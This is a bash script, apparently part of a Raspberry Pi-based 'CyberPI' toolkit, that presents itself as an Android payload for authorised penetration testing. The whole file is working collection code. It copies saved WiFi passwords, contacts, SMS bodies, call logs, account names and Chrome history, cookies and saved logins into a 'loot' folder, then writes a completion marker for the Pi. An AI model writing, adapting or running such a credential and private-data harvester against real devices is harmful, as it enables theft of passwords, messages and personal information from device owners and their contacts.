#!/bin/bash
# ============================================================================
#  CyberPI Android Payload v3 — Multi-Target Edition
#
#  Deep data extraction for Android via Termux or similar terminal.
#  Collects: device info, WiFi, contacts, SMS, call log, installed apps,
#            running processes, network info, accounts.
#
#  Usage: bash android_payload.sh [PROFILE_NAME]
#
#  Runs with whatever permissions Termux has (root = bonus).
#  Many commands require root or specific Android permissions.
#
#  AUTHORIZED PENETRATION TESTING ONLY.
#  Author: Mr.D137
#  License: MIT (Educational Use)
# ============================================================================

set -uo pipefail

PROFILE_NAME="${1:-}"
SELF_DIR="$(cd "$(dirname "$0")" && pwd)"

# Output location: profile dir on USB if given, else /sdcard
if [ -n "$PROFILE_NAME" ]; then
    BASE="$SELF_DIR/targets/$PROFILE_NAME"
else
    BASE="$SELF_DIR"
fi

OUT="$BASE/collection_summary.txt"
LOOT="$BASE/loot"
mkdir -p "$BASE" "$LOOT/wifi" "$LOOT/system" "$LOOT/contacts" "$LOOT/apps" 2>/dev/null

{
echo "============================================"
echo "=== ANDROID COLLECTION v3 ==="
echo "============================================"
echo "Date: $(date)"
echo "User: $(whoami 2>/dev/null || echo unknown)"
echo "Profile: ${PROFILE_NAME:-root}"
echo ""

# ── Device Info ────────────────────────────────────────
echo "=== DEVICE INFO ==="
echo "Model: $(getprop ro.product.model 2>/dev/null || echo unknown)"
echo "Brand: $(getprop ro.product.brand 2>/dev/null || echo unknown)"
echo "Manufacturer: $(getprop ro.product.manufacturer 2>/dev/null || echo unknown)"
echo "Device: $(getprop ro.product.device 2>/dev/null || echo unknown)"
echo "Android Version: $(getprop ro.build.version.release 2>/dev/null || echo unknown)"
echo "SDK: $(getprop ro.build.version.sdk 2>/dev/null || echo unknown)"
echo "Build: $(getprop ro.build.display.id 2>/dev/null || echo unknown)"
echo "Security Patch: $(getprop ro.build.version.security_patch 2>/dev/null || echo unknown)"
echo "Serial: $(getprop ro.serialno 2>/dev/null || echo unknown)"
echo "Board: $(getprop ro.product.board 2>/dev/null || echo unknown)"
echo "CPU ABI: $(getprop ro.product.cpu.abi 2>/dev/null || echo unknown)"
echo "Fingerprint: $(getprop ro.build.fingerprint 2>/dev/null || echo unknown)"
echo "Bootloader: $(getprop ro.bootloader 2>/dev/null || echo unknown)"
echo "Kernel: $(uname -a 2>/dev/null || echo unknown)"

# ── Network ────────────────────────────────────────────
echo ""
echo "=== NETWORK ==="
ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "no network info"
echo ""
echo "--- Routing ---"
ip route 2>/dev/null | head -10
echo ""
echo "--- DNS ---"
getprop net.dns1 2>/dev/null
getprop net.dns2 2>/dev/null
cat /etc/resolv.conf 2>/dev/null

# ── WiFi ───────────────────────────────────────────────
echo ""
echo "========================================="
echo "=== WIFI INFORMATION ==="
echo "========================================="

# Current WiFi
echo "--- Current WiFi ---"
dumpsys wifi 2>/dev/null | grep -E "mWifiInfo|SSID|BSSID|IP|Link speed|Signal" | head -20

# Saved WiFi networks (needs root for passwords)
echo "--- Saved Networks ---"
if [ -f /data/misc/wifi/wpa_supplicant.conf ]; then
    cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null && \
        cp /data/misc/wifi/wpa_supplicant.conf "$LOOT/wifi/" 2>/dev/null
elif [ -d /data/misc/wifi ]; then
    ls -la /data/misc/wifi/ 2>/dev/null
    # Android 8+ uses WifiConfigStore.xml
    for wf in /data/misc/wifi/WifiConfigStore.xml \
              /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml; do
        if [ -f "$wf" ]; then
            cat "$wf" 2>/dev/null && cp "$wf" "$LOOT/wifi/" 2>/dev/null
        fi
    done
fi

# WiFi scan results
echo "--- WiFi Scan ---"
dumpsys wifi 2>/dev/null | grep -A2 "SSID:" | head -40

# ── Contacts (content provider, needs permission) ──────
echo ""
echo "=== CONTACTS ==="
content query --uri content://contacts/phones/ 2>/dev/null | head -50 | tee "$LOOT/contacts/phones.txt"

# ── SMS Messages ──────────────────────────────────────
echo ""
echo "=== SMS ==="
content query --uri content://sms/ --projection "address,body,date,type" 2>/dev/null | head -50 | tee "$LOOT/contacts/sms.txt"

# ── Call Log ──────────────────────────────────────────
echo ""
echo "=== CALL LOG ==="
content query --uri content://call_log/calls/ --projection "number,name,date,duration,type" 2>/dev/null | head -50 | tee "$LOOT/contacts/call_log.txt"

# ── Installed Apps ────────────────────────────────────
echo ""
echo "=== INSTALLED APPS ==="
pm list packages -f 2>/dev/null | head -100 | tee "$LOOT/apps/packages.txt"

echo "--- Third-party apps ---"
pm list packages -3 2>/dev/null | tee "$LOOT/apps/third_party.txt"

# ── Accounts ──────────────────────────────────────────
echo ""
echo "=== ACCOUNTS ==="
dumpsys account 2>/dev/null | grep -i "name=" | head -30

# ── Running Processes ─────────────────────────────────
echo ""
echo "=== PROCESSES ==="
ps -A 2>/dev/null | head -50 || ps 2>/dev/null | head -50

# ── Accessibility & Security ──────────────────────────
echo ""
echo "=== SECURITY ==="
echo "Encrypted: $(getprop ro.crypto.state 2>/dev/null || echo unknown)"
echo "USB Debug: $(getprop init.svc.adbd 2>/dev/null || echo unknown)"
echo "Root Check:"
which su 2>/dev/null && echo "su binary FOUND" || echo "su not found"
which magisk 2>/dev/null && echo "Magisk FOUND" || echo "no magisk"

# ── Browser Data (if accessible) ─────────────────────
echo ""
echo "=== BROWSER DATA ==="
# Chrome
chrome_db="/data/data/com.android.chrome/app_chrome/Default"
if [ -d "$chrome_db" ]; then
    echo "Chrome profile found"
    ls -la "$chrome_db/" 2>/dev/null
    cp "$chrome_db/History" "$LOOT/system/chrome_history.db" 2>/dev/null
    cp "$chrome_db/Cookies" "$LOOT/system/chrome_cookies.db" 2>/dev/null
    cp "$chrome_db/Login Data" "$LOOT/system/chrome_logins.db" 2>/dev/null
else
    echo "Chrome data: access denied (root required)"
fi

# ── System Logs ───────────────────────────────────────
echo ""
echo "=== LOGCAT (last 100 lines) ==="
logcat -d -t 100 2>/dev/null | head -100

# ── Storage Info ──────────────────────────────────────
echo ""
echo "=== STORAGE ==="
df -h 2>/dev/null | head -15

echo ""
echo "=== OPEN PORTS ==="
cat /proc/net/tcp 2>/dev/null | head -20
ss -tlnp 2>/dev/null | head -15

# ── Battery Info ──────────────────────────────────────
echo ""
echo "=== BATTERY ==="
dumpsys battery 2>/dev/null | head -15

echo ""
echo "========================================="
echo "=== COLLECTION COMPLETE ==="
echo "========================================="
echo "Files collected:"
find "$LOOT" -type f 2>/dev/null | while read f; do
    echo "  $(du -h "$f" 2>/dev/null | cut -f1)  $(echo "$f" | sed "s|$BASE/||")"
done
echo "Profile: ${PROFILE_NAME:-root}"
} > "$OUT" 2>&1

# Flush data to disk
sync 2>/dev/null

# Signal marker for Pi to detect completion
echo "done" > "$BASE/.canary_unlock"
[ -n "$PROFILE_NAME" ] && echo "done" > "$SELF_DIR/.canary_unlock" 2>/dev/null

sync 2>/dev/null
exit
